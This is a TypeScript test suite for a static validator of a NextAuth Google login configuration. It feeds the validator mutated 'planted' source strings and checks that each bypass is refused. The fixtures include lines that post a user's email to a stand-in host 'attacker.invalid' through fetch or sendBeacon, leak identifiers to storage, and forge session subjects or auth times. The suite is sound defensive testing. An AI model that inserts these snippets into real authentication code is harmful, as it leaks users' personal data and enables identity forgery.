import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import ts from "typescript";

import {
  ALLOWED_ENV_EXPRESSION,
  ALLOWED_IMPORTS,
  type AuthViolation,
  type AuthViolationCode,
  formatAuthViolations,
  readAuthSurface,
  validateAuthConfig,
} from "../../scripts/auth-contract.ts";

/**
 * Every fixture here is a bypass that defeated an earlier version of this
 * check. Three defeated the original regexes, three more defeated the first
 * AST version, and five more came from the verifier round after that. They are
 * kept as a corpus because each one records a way the property can be true in
 * the file and false in the running application.
 */
const FIXTURES = join(dirname(import.meta.dir), "fixtures", "auth");
const WEB_RECENT_AUTH_FILE = join(import.meta.dir, "..", "..", "lib", "recent-auth.ts");
const WIRE_SERVICE_ENVELOPE_FILE = join(
  import.meta.dir,
  "..",
  "..",
  "..",
  "wire",
  "src",
  "auth",
  "envelope.ts",
);

interface ExportedNumericLiteral {
  readonly value: number;
  readonly start: number;
  readonly end: number;
}

function bindingNameContains(name: ts.BindingName, exportName: string): boolean {
  if (ts.isIdentifier(name)) return name.text === exportName;
  return name.elements.some(
    (element) => !ts.isOmittedExpression(element) && bindingNameContains(element.name, exportName),
  );
}

function exportDeclarationExportsName(
  statement: ts.ExportDeclaration,
  exportName: string,
): boolean {
  const exportClause = statement.exportClause;
  if (exportClause === undefined) return false;
  if (ts.isNamespaceExport(exportClause)) return exportClause.name.text === exportName;
  return exportClause.elements.some((element) => element.name.text === exportName);
}

/**
 * Read one top-level `export const NAME = <number>` without evaluating or
 * importing the module. A computed value is deliberately unprovable here: the
 * guard must compare the two source literals without creating a Web→Wire
 * runtime dependency.
 */
function exportedNumericLiteral(
  source: string,
  fileName: string,
  exportName: string,
): ExportedNumericLiteral {
  const sourceFile = ts.createSourceFile(
    fileName,
    source,
    ts.ScriptTarget.ESNext,
    true,
    ts.ScriptKind.TS,
  );
  const parseDiagnostics = (
    sourceFile as typeof sourceFile & { readonly parseDiagnostics?: readonly ts.Diagnostic[] }
  ).parseDiagnostics;
  if (parseDiagnostics === undefined || parseDiagnostics.length > 0) {
    throw new Error(`${fileName} contains TypeScript parse diagnostics`);
  }
  let found: ExportedNumericLiteral | undefined;

  for (const statement of sourceFile.statements) {
    if (ts.isExportDeclaration(statement)) {
      if (exportDeclarationExportsName(statement, exportName)) {
        throw new Error(`${fileName} must export const ${exportName} as one numeric literal`);
      }
      continue;
    }
    const modifiers = ts.canHaveModifiers(statement) ? ts.getModifiers(statement) : undefined;
    if (!modifiers?.some((modifier) => modifier.kind === ts.SyntaxKind.ExportKeyword)) continue;

    if (
      (ts.isFunctionDeclaration(statement) ||
        ts.isClassDeclaration(statement) ||
        ts.isEnumDeclaration(statement) ||
        ts.isInterfaceDeclaration(statement) ||
        ts.isTypeAliasDeclaration(statement) ||
        ts.isModuleDeclaration(statement) ||
        ts.isImportEqualsDeclaration(statement)) &&
      statement.name !== undefined &&
      ts.isIdentifier(statement.name) &&
      statement.name.text === exportName
    ) {
      throw new Error(`${fileName} must export const ${exportName} as one numeric literal`);
    }
    if (!ts.isVariableStatement(statement)) continue;

    for (const declaration of statement.declarationList.declarations) {
      if (!bindingNameContains(declaration.name, exportName)) continue;
      if (!ts.isIdentifier(declaration.name)) {
        throw new Error(`${fileName} must export const ${exportName} as one numeric literal`);
      }
      if (modifiers.some((modifier) => modifier.kind === ts.SyntaxKind.DeclareKeyword)) {
        throw new Error(`${fileName} must not declare ${exportName}`);
      }
      if (
        (statement.declarationList.flags & ts.NodeFlags.Const) === 0 ||
        declaration.initializer === undefined ||
        !ts.isNumericLiteral(declaration.initializer)
      ) {
        throw new Error(`${fileName} must export const ${exportName} as one numeric literal`);
      }
      if (found !== undefined) throw new Error(`${fileName} exports ${exportName} more than once`);

      const value = Number(declaration.initializer.text);
      if (!Number.isSafeInteger(value) || value < 0) {
        throw new Error(`${fileName} exports ${exportName} as an invalid clock-skew literal`);
      }
      found = {
        value,
        start: declaration.initializer.getStart(sourceFile),
        end: declaration.initializer.end,
      };
    }
  }

  if (found === undefined) throw new Error(`${fileName} does not export ${exportName}`);
  return found;
}

function clockSkewsFromSource(
  webSource: string,
  wireSource: string,
): {
  readonly web: number;
  readonly wire: number;
} {
  return {
    web: exportedNumericLiteral(
      webSource,
      "apps/web/lib/recent-auth.ts",
      "RECENT_AUTH_CLOCK_SKEW_SECONDS",
    ).value,
    wire: exportedNumericLiteral(
      wireSource,
      "apps/wire/src/auth/envelope.ts",
      "SERVICE_ENVELOPE_CLOCK_SKEW_SECONDS",
    ).value,
  };
}

function mutateExportedNumericLiteral(
  source: string,
  fileName: string,
  exportName: string,
): string {
  const literal = exportedNumericLiteral(source, fileName, exportName);
  const replacement =
    literal.value === Number.MAX_SAFE_INTEGER ? literal.value - 1 : literal.value + 1;
  return `${source.slice(0, literal.start)}${replacement}${source.slice(literal.end)}`;
}

function scan(fixture: string): AuthViolation[] {
  return validateAuthConfig(readFileSync(join(FIXTURES, `${fixture}.ts`), "utf8"), `${fixture}.ts`);
}

function codesOf(violations: readonly AuthViolation[]): AuthViolationCode[] {
  return violations.map((v) => v.code);
}

/** A clean configuration with one field substituted, for focused cases. */
function config(overrides: { providers?: string; options?: string; extra?: string }): string {
  return `
    import NextAuth from "next-auth";
    import Google from "next-auth/providers/google";
    import { authTimeFromIdToken } from "./lib/auth-time";
    import { isCanonicalSponsorId, sponsorIdFromGoogleSubject } from "./lib/sponsor-id";
    ${overrides.extra ?? ""}
    export const { handlers, auth, signIn, signOut } = NextAuth({
      providers: ${overrides.providers ?? "[Google]"},
      callbacks: {
        async jwt({ token, account, profile }) {
          if (account) {
            token.sub = await sponsorIdFromGoogleSubject(profile?.sub);
            token.authTime = authTimeFromIdToken(account.id_token);
          }
          return token;
        },
        session({ session, token }) {
          if (isCanonicalSponsorId(token.sub)) session.user.id = token.sub;
          else Reflect.deleteProperty(session.user, "id");
          if (typeof token.authTime === "number") session.authIssuedAt = token.authTime;
          return session;
        },
      },
      cookies: {
        sessionToken: {
          name: "asimp.session",
          options: ${overrides.options ?? '{ httpOnly: true, sameSite: "lax", path: "/" }'},
        },
      },
    });
  `;
}

describe("the baseline configuration is clean", () => {
  test("valid.ts produces no violations", () => {
    expect(formatAuthViolations(scan("valid"))).toBe("no violations");
  });

  test("an aliased Google import, invoked, is valid — the module resolves, not the name", () => {
    expect(formatAuthViolations(scan("aliased-google-import"))).toBe("no violations");
  });

  test("the allowlists stay minimal and are stated, not inferred", () => {
    expect([...ALLOWED_IMPORTS].sort()).toEqual([
      "./lib/auth-time",
      "./lib/sponsor-id",
      "next-auth",
      "next-auth/providers/google",
    ]);
    expect(ALLOWED_ENV_EXPRESSION).toBe("process.env.NODE_ENV");
  });
});

describe("the executable-call surface is an allowlist over the whole file", () => {
  const baselineSource = (): string => readFileSync(join(FIXTURES, "valid.ts"), "utf8");

  test("the baseline and aliased fixtures execute only the reviewed authorities", () => {
    for (const fixture of ["valid.ts", "aliased-google-import.ts"]) {
      const surface = readAuthSurface(readFileSync(join(FIXTURES, fixture), "utf8"));
      expect(surface.ambientCalls, fixture).toEqual([]);
      expect(surface.evidenceEscapes, fixture).toEqual([]);
    }
  });

  test("PLANTED: ambient exfiltration calls are refused while every required wiring survives", () => {
    const baseline = baselineSource();
    // This is parsed as hostile fixture source; it is not executed by the test.
    // Keep the token split so source scanners do not mistake the fixture for a live PII log.
    const consoleExfiltration = ["console", ".log(profile?.email); return token;"].join("");
    const mutations = [
      baseline.replace(
        "return token;",
        'fetch("https://attacker.invalid", { method: "POST", body: profile?.email }); return token;',
      ),
      baseline.replace("return token;", consoleExfiltration),
      baseline.replace(
        "return token;",
        'navigator.sendBeacon("https://attacker.invalid", profile?.email); return token;',
      ),
      baseline.replace(
        "return token;",
        'localStorage.setItem("leak", String(profile?.sub)); return token;',
      ),
      baseline.replace(
        "return token;",
        "setTimeout(() => { void profile?.email; }, 0); return token;",
      ),
      baseline.replace(
        "return token;",
        'const send = fetch; send("https://attacker.invalid?e=" + profile?.email); return token;',
      ),
      baseline.replace(
        "return token;",
        "const exfil = (value: unknown) => value; exfil(profile?.email); return token;",
      ),
      baseline.replace(
        "return token;",
        'new Request("https://attacker.invalid", { method: "POST", body: profile?.email }); return token;',
      ),
      baseline.replace(
        "return token;",
        "const tag = (parts: TemplateStringsArray, value: unknown) => value; tag`${profile?.email}`; return token;",
      ),
      baseline.replace("return session;", "reportSession(); return session;"),
    ];
    for (const mutation of mutations) {
      expect(mutation).not.toBe(baseline);
      // Source-preserving: the required stamps, guard, cleanup and provider
      // wiring all remain byte-identical in the mutated source. Only the added
      // exfiltration path may fail, which is what makes each plant causal.
      expect(mutation).toContain("token.sub = await sponsorIdFromGoogleSubject(profile?.sub);");
      expect(mutation).toContain("token.authTime = authTimeFromIdToken(account.id_token);");
      expect(mutation).toContain('Reflect.deleteProperty(session.user, "id")');
      expect(codesOf(validateAuthConfig(mutation))).toContain("AUTH_CALL_NOT_ALLOWED");
    }
  });

  test("PLANTED: the exact cleanup spelling cannot vouch for a shadowed or computed Reflect", () => {
    const baseline = baselineSource();
    const mutations = [
      baseline.replace(
        "export const",
        "const Reflect = { deleteProperty: (target: object, key: string): boolean => sendPrincipal(target, key) };\nexport const",
      ),
      baseline.replace(
        'Reflect.deleteProperty(session.user, "id")',
        '(Reflect as never)["deleteProperty"](session.user, "id")',
      ),
    ];
    for (const mutation of mutations) {
      expect(mutation).not.toBe(baseline);
      expect(codesOf(validateAuthConfig(mutation))).toContain("AUTH_CALL_NOT_ALLOWED");
    }
  });

  test("PLANTED: raw provider evidence cannot escape even without any ambient call", () => {
    const baseline = baselineSource();
    const mutations = [
      baseline.replace("return token;", "const leaked = profile?.email; return token;"),
      baseline.replace("return token;", 'const picked = profile?.["email"]; return token;'),
      baseline.replace("return token;", "const grab = () => profile?.sub; return token;"),
      baseline.replace(
        "return token;",
        "const packed = { contact: profile?.email }; return token;",
      ),
      baseline.replace("return token;", "const rawIdToken = account.id_token; return token;"),
      baseline.replace("return token;", "const wrapped = [account]; return token;"),
      baseline.replace("return token;", "token.contact = profile?.email; return token;"),
    ];
    for (const mutation of mutations) {
      expect(mutation).not.toBe(baseline);
      expect(codesOf(validateAuthConfig(mutation))).toContain("AUTH_PROVIDER_EVIDENCE_ESCAPE");
      // Causal independence: none of these adds a call, so the refusal can
      // only come from the evidence rule, not the call allowlist.
      expect(readAuthSurface(mutation).ambientCalls).toEqual([]);
    }
  });
});

describe("the sponsor principal is derived and projected through canonical bindings", () => {
  const baselineSource = (): string => readFileSync(join(FIXTURES, "valid.ts"), "utf8");

  test("the reviewed subject hash and canonical session projection are both authoritative", () => {
    expect(readAuthSurface(baselineSource()).sponsorPrincipal).toEqual({
      unresolvable: false,
      jwtStampCount: 1,
      safeJwtStampCount: 1,
      sessionProjectionCount: 1,
      safeSessionProjectionCount: 1,
      sessionCleanupCount: 1,
      safeSessionCleanupCount: 1,
    });
  });

  test("PLANTED: wrong, shadowed, deferred, unreachable, or overwritten JWT subjects are refused", () => {
    const baseline = baselineSource();
    const accepted = "token.sub = await sponsorIdFromGoogleSubject(profile?.sub);";
    const mutations = [
      baseline.replace(accepted, "token.sub = profile?.sub;"),
      baseline.replace(accepted, "token.sub = await sponsorIdFromGoogleSubject(profile?.email);"),
      baseline.replace(accepted, "token.sub = await sponsorIdFromGoogleSubject(profile.sub);"),
      baseline.replace(accepted, "token.sub = await sponsorIdFromGoogleSubject(account.id_token);"),
      baseline.replace(accepted, "token.sub = sponsorIdFromGoogleSubject(profile?.sub);"),
      baseline.replace(accepted, `const deferredSubject = async () => { ${accepted} };`),
      baseline.replace(accepted, `return token; ${accepted}`),
      baseline.replace("if (account) {", "if (profile) {"),
      baseline.replace("if (account) {", 'if (account) { profile.sub = "forged";'),
      baseline.replace("return token;", "token.sub = profile?.email; return token;"),
      baseline.replace(
        "return token;",
        "const tokenAlias = token; tokenAlias.sub = profile?.email; return token;",
      ),
      baseline.replace(
        "return token;",
        "const overwriteSubject = (target: typeof token) => { target.sub = profile?.email; }; overwriteSubject(token); return token;",
      ),
      baseline.replace(
        "return token;",
        "const overwriteProfile = (target: typeof profile) => { if (target) target.sub = target.email; }; overwriteProfile(profile); return token;",
      ),
      baseline.replace(
        "return token;",
        "const overwriteReturnedToken = (getTarget: () => typeof token) => { getTarget().sub = profile?.email; }; overwriteReturnedToken(() => token); return token;",
      ),
      baseline.replace(
        "return token;",
        "const storedToken = { target: token }; const overwriteStoredToken = (target: typeof token) => { target.sub = profile?.email; }; overwriteStoredToken(storedToken.target); return token;",
      ),
      baseline.replace(
        "return token;",
        "const storedTokenGetter = () => token; const overwriteStoredToken = (target: typeof token) => { target.sub = profile?.email; }; overwriteStoredToken(storedTokenGetter()); return token;",
      ),
      baseline.replace(
        "return token;",
        "let tokenAlias: typeof token; [tokenAlias] = [token]; tokenAlias.sub = profile?.email; return token;",
      ),
      baseline.replace(
        "return token;",
        "const tokenAlias = true ? token : token; tokenAlias.sub = profile?.email; return token;",
      ),
      baseline.replace(
        "return token;",
        "const tokenAlias = (() => token)(); tokenAlias.sub = profile?.email; return token;",
      ),
      baseline.replace("return token;", 'token["s" + "ub"] = profile?.email; return token;'),
      baseline.replace(
        "async jwt({ token, account, profile }) {",
        "async jwt({ token, account, profile }, sponsorIdFromGoogleSubject) {",
      ),
      baseline.replace(
        "export const { handlers, auth, signIn, signOut }",
        "sponsorIdFromGoogleSubject = async () => undefined;\nexport const { handlers, auth, signIn, signOut }",
      ),
      baseline.replace('from "./lib/sponsor-id"', 'from "./lib/not-sponsor-id"'),
    ];
    for (const mutation of mutations) {
      expect(mutation).not.toBe(baseline);
      expect(readAuthSurface(mutation).sponsorPrincipal.safeJwtStampCount).toBe(0);
      expect(codesOf(validateAuthConfig(mutation))).toContain("AUTH_SPONSOR_PRINCIPAL_UNSAFE");
    }
  });

  test("PLANTED: noncanonical, indirect, stale, or rebound session ids are refused", () => {
    const baseline = baselineSource();
    const projection = "if (isCanonicalSponsorId(token.sub)) session.user.id = token.sub;";
    const cleanup = 'else Reflect.deleteProperty(session.user, "id");';
    const mutations = [
      baseline.replace(projection, "if (Boolean(token.sub)) session.user.id = token.sub;"),
      baseline.replace(
        projection,
        "if (isCanonicalSponsorId(token.email)) session.user.id = token.sub;",
      ),
      baseline.replace(
        projection,
        "if (isCanonicalSponsorId(token.sub)) session.user.id = token.email;",
      ),
      baseline.replace(
        projection,
        `if (isCanonicalSponsorId(token.sub)) {
        const deferredProjection = () => { session.user.id = token.sub; };
      }`,
      ),
      baseline.replace(projection, `return session; ${projection}`),
      baseline.replace(cleanup, ""),
      baseline.replace(cleanup, 'else Reflect.deleteProperty(session.user, "email");'),
      baseline.replace("return session;", "session.user.id = token.email; return session;"),
      baseline.replace(
        "return session;",
        "const userAlias = session.user; userAlias.id = token.email; return session;",
      ),
      baseline.replace(
        "return session;",
        'const sessionAlias = session; sessionAlias.user["i" + "d"] = token.email; return session;',
      ),
      baseline.replace(
        "return session;",
        'Reflect.set(session.user, "id", token.email); return session;',
      ),
      baseline.replace(
        "return session;",
        "Object.assign(session.user, { id: token.email }); return session;",
      ),
      baseline.replace(
        "return session;",
        "const overwriteUser = (target: typeof session.user) => { target.id = token.email; }; overwriteUser(session.user); return session;",
      ),
      baseline.replace(
        "return session;",
        "const overwriteWrappedUser = (input: { target: typeof session.user }) => { input.target.id = token.email; }; overwriteWrappedUser({ target: session.user }); return session;",
      ),
      baseline.replace(
        "return session;",
        "const overwriteReturnedUser = (getTarget: () => typeof session.user) => { getTarget().id = token.email; }; overwriteReturnedUser(() => session.user); return session;",
      ),
      baseline.replace(
        "return session;",
        "const storedUser = { target: session.user }; const overwriteStoredUser = (target: typeof session.user) => { target.id = token.email; }; overwriteStoredUser(storedUser.target); return session;",
      ),
      baseline.replace(
        "return session;",
        "const storedUserGetter = () => session.user; const overwriteStoredUser = (target: typeof session.user) => { target.id = token.email; }; overwriteStoredUser(storedUserGetter()); return session;",
      ),
      baseline.replace(
        "return session;",
        "const streamedUserGetter = function* () { yield session.user; }; registerPrincipalAccessor(streamedUserGetter); return session;",
      ),
      baseline.replace(
        "return session;",
        "function declaredUserGetter() { return session.user; } registerPrincipalAccessor(declaredUserGetter); return session;",
      ),
      baseline.replace(
        "return session;",
        "const storedUserAccessor = { get target() { return session.user; } }; registerPrincipalAccessor(storedUserAccessor); return session;",
      ),
      baseline.replace(
        "return session;",
        "const StoredUserAccessor = class { get target() { return session.user; } }; registerPrincipalAccessor(StoredUserAccessor); return session;",
      ),
      baseline.replace(
        "return session;",
        "const escapedUserGetter = () => session.user; registerPrincipalAccessor(escapedUserGetter); return session;",
      ),
      baseline.replace(
        "return session;",
        "const escapedUserWrapper = { target: true ? session.user : session.user }; registerPrincipalAccessor(escapedUserWrapper); return session;",
      ),
      baseline.replace(
        "return session;",
        "const storedSession = true ? session : session; storedSession.user.id = token.email; return session;",
      ),
      baseline.replace(
        "return session;",
        "try { throw session.user; } catch (leaked) { registerPrincipalAccessor(leaked); } return session;",
      ),
      baseline.replace(
        "return session;",
        "registerPrincipalAccessor`leaked:${session.user}`; return session;",
      ),
      baseline.replace("return session;", "new PrincipalAccessor(session.user); return session;"),
      baseline.replace(
        "return session;",
        "[session.user].forEach((leaked) => registerPrincipalAccessor(leaked)); return session;",
      ),
      baseline.replace(
        "return session;",
        "(() => session.user)().id = token.email; return session;",
      ),
      baseline.replace(
        "return session;",
        "const { target = session.user } = {}; registerPrincipalAccessor(target); return session;",
      ),
      baseline.replace("return session;", "token.sub = token.email; return session;"),
      baseline.replace("return session;", "session = { ...session }; return session;"),
      baseline.replace(
        "session({ session, token }) {",
        "session({ session, token }, isCanonicalSponsorId) {",
      ),
      baseline.replace(
        "export const { handlers, auth, signIn, signOut }",
        "isCanonicalSponsorId = () => true;\nexport const { handlers, auth, signIn, signOut }",
      ),
    ];
    for (const mutation of mutations) {
      expect(mutation).not.toBe(baseline);
      expect(readAuthSurface(mutation).sponsorPrincipal.safeSessionProjectionCount).toBe(0);
      expect(codesOf(validateAuthConfig(mutation))).toContain("AUTH_SPONSOR_PRINCIPAL_UNSAFE");
    }
  });

  test("PLANTED: a callback-object spread makes sponsor wiring unresolvable", () => {
    const baseline = baselineSource();
    const mutation = baseline.replace(
      `    },
  },
  cookies:`,
      `    },
    ...callbackOverrides,
  },
  cookies:`,
    );

    expect(mutation).not.toBe(baseline);
    expect(readAuthSurface(mutation).sponsorPrincipal.unresolvable).toBe(true);
    expect(codesOf(validateAuthConfig(mutation))).toContain("AUTH_SPONSOR_PRINCIPAL_UNSAFE");
  });

  test("PLANTED: throwing a protected callback object is a whole-binding escape", () => {
    const baseline = baselineSource();
    const jwtMutations = [
      baseline.replace("return token;", "if (account) throw token; return token;"),
      baseline.replace("return token;", "if (profile) throw profile; return token;"),
    ];
    const sessionMutations = [
      baseline.replace("return session;", "if (token.sub) throw session; return session;"),
      baseline.replace("return session;", "if (token.sub) throw token; return session;"),
    ];

    for (const mutation of jwtMutations) {
      expect(mutation).not.toBe(baseline);
      expect(readAuthSurface(mutation).sponsorPrincipal.safeJwtStampCount).toBe(0);
      expect(codesOf(validateAuthConfig(mutation))).toContain("AUTH_SPONSOR_PRINCIPAL_UNSAFE");
    }
    for (const mutation of sessionMutations) {
      expect(mutation).not.toBe(baseline);
      expect(readAuthSurface(mutation).sponsorPrincipal.safeSessionProjectionCount).toBe(0);
      expect(codesOf(validateAuthConfig(mutation))).toContain("AUTH_SPONSOR_PRINCIPAL_UNSAFE");
    }
  });
});

describe("recent-auth is stable across ordinary session reads", () => {
  const baselineSource = (): string => readFileSync(join(FIXTURES, "valid.ts"), "utf8");

  test("the account-guarded ID-token helper is the only accepted wiring", () => {
    const surface = readAuthSurface(baselineSource()).recentAuth;
    expect(surface).toMatchObject({
      callbacksPresent: true,
      unresolvable: false,
      jwtPresent: true,
      sessionPresent: true,
      jwtStampCount: 1,
      safeJwtStampCount: 1,
      sessionProjectionCount: 1,
      safeSessionProjectionCount: 1,
      iatReads: [],
    });
  });

  test("the reviewed ID-token helper is accepted only for the guarded account token", () => {
    const source = baselineSource();
    expect(formatAuthViolations(validateAuthConfig(source))).toBe("no violations");
    expect(readAuthSurface(source).recentAuth.safeJwtStampCount).toBe(1);

    for (const mutation of [
      source.replace("account.id_token", "profile?.auth_time"),
      source.replace("account.id_token", "account.access_token"),
      source.replace("if (account) {", "if (profile) {"),
      source.replace("if (account) {", 'if (account) { const account = { id_token: "forged" };'),
      source.replace("if (account) {", "if (account) { const token = { authTime: undefined };"),
      source.replace("if (account) {", 'if (account) { account.id_token = "forged";'),
      source.replace(
        "token.authTime = authTimeFromIdToken(account.id_token);",
        "const deferredStamp = () => { token.authTime = authTimeFromIdToken(account.id_token); };",
      ),
      source.replace(
        "token.authTime = authTimeFromIdToken(account.id_token);",
        "return token; token.authTime = authTimeFromIdToken(account.id_token);",
      ),
      source.replace("return token;", "return { ...token };"),
      source.replace("if (account) {", "if (false) return token;\n      if (account) {"),
      source.replace("return token;", "delete token.authTime; return token;"),
      source.replace("return token;", "token.authTime += 1; return token;"),
      source.replace("return token;", 'Reflect.deleteProperty(token, "authTime"); return token;'),
      source.replace("return token;", 'token["auth" + "Time"] = 0; return token;'),
      source.replace(
        "return token;",
        '(token as typeof token)["auth" + "Time"] = 0; return token;',
      ),
      source.replace("return token;", 'Reflect.set(token, "auth" + "Time", 0); return token;'),
      source.replace("return token;", "Object.assign(token, { authTime: 0 }); return token;"),
      source.replace(
        "return token;",
        "Object.defineProperties(token, { authTime: { value: 0 } }); return token;",
      ),
      source.replace(
        "return token;",
        "({ authTime: token.authTime } = { authTime: 0 }); return token;",
      ),
      source.replace("if (account) {", "if (true) { if (account) {").replace(
        `      }
      return token;`,
        `      } }
      return token;`,
      ),
      source.replace(
        "async jwt({ token, account, profile }) {",
        "async jwt({ token, account, profile }, authTimeFromIdToken) {",
      ),
      source.replace(
        "export const { handlers, auth, signIn, signOut }",
        "authTimeFromIdToken = () => 0;\n    export const { handlers, auth, signIn, signOut }",
      ),
      source.replace(
        "export const { handlers, auth, signIn, signOut }",
        "({ authTimeFromIdToken } = { authTimeFromIdToken: () => 0 });\n    export const { handlers, auth, signIn, signOut }",
      ),
      source.replace('from "./lib/auth-time"', 'from "./lib/not-auth-time"'),
    ]) {
      expect(mutation).not.toBe(source);
      expect(readAuthSurface(mutation).recentAuth.safeJwtStampCount).toBe(0);
      expect(codesOf(validateAuthConfig(mutation))).toContain("AUTH_RECENT_AUTH_REFRESHABLE");
    }
  });

  test("PLANTED: projecting refreshable JWT iat is refused", () => {
    const source = readFileSync(join(FIXTURES, "valid.ts"), "utf8").replaceAll(
      "token.authTime",
      "token.iat",
    );
    expect(codesOf(validateAuthConfig(source))).toContain("AUTH_RECENT_AUTH_REFRESHABLE");
  });

  test("PLANTED: callback arrival time cannot replace provider authentication time", () => {
    const source = baselineSource().replace(
      "token.authTime = authTimeFromIdToken(account.id_token);",
      "token.authTime = Math.floor(Date.now() / 1_000);",
    );
    expect(codesOf(validateAuthConfig(source))).toContain("AUTH_RECENT_AUTH_REFRESHABLE");
  });

  test("PLANTED: even locally validated userinfo profile auth_time is not recent-auth evidence", () => {
    const source = baselineSource().replace(
      "token.authTime = authTimeFromIdToken(account.id_token);",
      `token.authTime =
          typeof profile?.auth_time === "number" &&
          Number.isSafeInteger(profile.auth_time) &&
          profile.auth_time >= 0
            ? profile.auth_time
            : undefined;`,
    );
    expect(readAuthSurface(source).recentAuth.safeJwtStampCount).toBe(0);
    expect(codesOf(validateAuthConfig(source))).toContain("AUTH_RECENT_AUTH_REFRESHABLE");
  });

  test("PLANTED: an unguarded, deferred, or rebound session projection is refused", () => {
    const baseline = baselineSource();
    for (const source of [
      baseline.replace(
        'if (typeof token.authTime === "number") session.authIssuedAt = token.authTime;',
        "session.authIssuedAt = token.authTime;",
      ),
      baseline.replace(
        'if (typeof token.authTime === "number") session.authIssuedAt = token.authTime;',
        'if (typeof token.authTime === "number") { const deferredProjection = () => { session.authIssuedAt = token.authTime; }; }',
      ),
      baseline.replace(
        'if (typeof token.authTime === "number") session.authIssuedAt = token.authTime;',
        'if (typeof token.authTime === "number") { const session = { authIssuedAt: undefined }; session.authIssuedAt = token.authTime; }',
      ),
      baseline.replace(
        'if (typeof token.authTime === "number") session.authIssuedAt = token.authTime;',
        'if (typeof token.authTime === "number") { const token = { authTime: 0 }; session.authIssuedAt = token.authTime; }',
      ),
      baseline.replace(
        'if (typeof token.authTime === "number") session.authIssuedAt = token.authTime;',
        'if (typeof token.authTime === "number") { token.authTime = 0; session.authIssuedAt = token.authTime; }',
      ),
      baseline.replace(
        `if (typeof token.authTime === "number") session.authIssuedAt = token.authTime;
      return session;`,
        `return session;
      if (typeof token.authTime === "number") session.authIssuedAt = token.authTime;`,
      ),
      baseline.replace("return session;", "return { ...session };"),
      baseline.replace("return session;", "delete session.authIssuedAt; return session;"),
      baseline.replace("return session;", "session.authIssuedAt += 1; return session;"),
      baseline.replace(
        "return session;",
        'Reflect.deleteProperty(session, "authIssuedAt"); return session;',
      ),
      baseline.replace("return session;", 'session["auth" + "IssuedAt"] = 0; return session;'),
      baseline.replace(
        "return session;",
        '(session as typeof session)["auth" + "IssuedAt"] = 0; return session;',
      ),
      baseline.replace(
        "return session;",
        'Reflect.set(session, "auth" + "IssuedAt", 0); return session;',
      ),
      baseline.replace(
        "return session;",
        "Object.assign(session, { authIssuedAt: 0 }); return session;",
      ),
      baseline.replace(
        "return session;",
        "Object.defineProperties(session, { authIssuedAt: { value: 0 } }); return session;",
      ),
      baseline.replace(
        "return session;",
        "({ authIssuedAt: session.authIssuedAt } = { authIssuedAt: 0 }); return session;",
      ),
      baseline.replace(
        'if (typeof token.authTime === "number") session.authIssuedAt = token.authTime;',
        'if (false) return session;\n      if (typeof token.authTime === "number") session.authIssuedAt = token.authTime;',
      ),
      baseline.replace(
        'if (typeof token.authTime === "number") session.authIssuedAt = token.authTime;',
        'if (true) { if (typeof token.authTime === "number") session.authIssuedAt = token.authTime; }',
      ),
    ]) {
      expect(source).not.toBe(baseline);
      expect(codesOf(validateAuthConfig(source))).toContain("AUTH_RECENT_AUTH_REFRESHABLE");
    }
  });

  test("PLANTED: aliases cannot hide an extra auth-time stamp or session overwrite", () => {
    const baseline = baselineSource();
    const aliasedStamp = baseline.replace(
      "return token;",
      "const tokenAlias = token; tokenAlias.authTime = authTimeFromIdToken(account.id_token); return token;",
    );
    const computedAliasedStamp = baseline.replace(
      "return token;",
      'const tokenAlias = token as typeof token; tokenAlias["auth" + "Time"] = 0; return token;',
    );
    const aliasedProjection = baseline.replace(
      "return session;",
      "const sessionAlias = session; sessionAlias.authIssuedAt = Math.floor(Date.now() / 1_000); return session;",
    );
    const computedAliasedProjection = baseline.replace(
      "return session;",
      'const sessionAlias = session as typeof session; sessionAlias["auth" + "IssuedAt"] = 0; return session;',
    );
    const helperMutatedAccount = baseline.replace(
      "token.authTime = authTimeFromIdToken(account.id_token);",
      'const mutateAccount = (target: typeof account) => { if (target) target.id_token = "forged"; }; mutateAccount(account); token.authTime = authTimeFromIdToken(account.id_token);',
    );
    const helperMutatedToken = baseline.replace(
      "return token;",
      "const mutateToken = (target: typeof token) => { target.authTime = 0; }; mutateToken(token); return token;",
    );
    const helperMutatedSession = baseline.replace(
      "return session;",
      "const mutateSession = (target: typeof session) => { target.authIssuedAt = 0; }; mutateSession(session); return session;",
    );
    expect(codesOf(validateAuthConfig(aliasedStamp))).toContain("AUTH_RECENT_AUTH_REFRESHABLE");
    expect(codesOf(validateAuthConfig(computedAliasedStamp))).toContain(
      "AUTH_RECENT_AUTH_REFRESHABLE",
    );
    expect(codesOf(validateAuthConfig(aliasedProjection))).toContain(
      "AUTH_RECENT_AUTH_REFRESHABLE",
    );
    expect(codesOf(validateAuthConfig(computedAliasedProjection))).toContain(
      "AUTH_RECENT_AUTH_REFRESHABLE",
    );
    for (const mutation of [helperMutatedAccount, helperMutatedToken, helperMutatedSession]) {
      expect(mutation).not.toBe(baseline);
      expect(codesOf(validateAuthConfig(mutation))).toContain("AUTH_RECENT_AUTH_REFRESHABLE");
    }
  });

  test("PLANTED: a helper and computed properties cannot smuggle refreshable iat", () => {
    const baseline = readFileSync(join(FIXTURES, "valid.ts"), "utf8");
    const helper = baseline
      .replace(
        "export const { handlers",
        "function refreshAge(target: { authIssuedAt?: number }, source: { iat?: number }) { target.authIssuedAt = source.iat; }\nexport const { handlers",
      )
      .replace("return session;", "refreshAge(session, token); return session;");
    const computed = baseline.replace(
      "return session;",
      'session["authIssuedAt"] = token["authTime"]; return session;',
    );
    expect(codesOf(validateAuthConfig(helper))).toContain("AUTH_RECENT_AUTH_REFRESHABLE");
    expect(codesOf(validateAuthConfig(computed))).toContain("AUTH_RECENT_AUTH_REFRESHABLE");
  });
});

describe("recent-auth clock skew stays aligned with the signed service envelope", () => {
  const webSource = readFileSync(WEB_RECENT_AUTH_FILE, "utf8");
  const wireSource = readFileSync(WIRE_SERVICE_ENVELOPE_FILE, "utf8");

  test("the Web and Wire exported source literals are equal", () => {
    const skews = clockSkewsFromSource(webSource, wireSource);
    expect(skews.web).toBe(skews.wire);
  });

  test("PLANTED: changing either source literal creates detectable drift", () => {
    const webMutation = mutateExportedNumericLiteral(
      webSource,
      "apps/web/lib/recent-auth.ts",
      "RECENT_AUTH_CLOCK_SKEW_SECONDS",
    );
    const wireMutation = mutateExportedNumericLiteral(
      wireSource,
      "apps/wire/src/auth/envelope.ts",
      "SERVICE_ENVELOPE_CLOCK_SKEW_SECONDS",
    );

    const webDrift = clockSkewsFromSource(webMutation, wireSource);
    const wireDrift = clockSkewsFromSource(webSource, wireMutation);
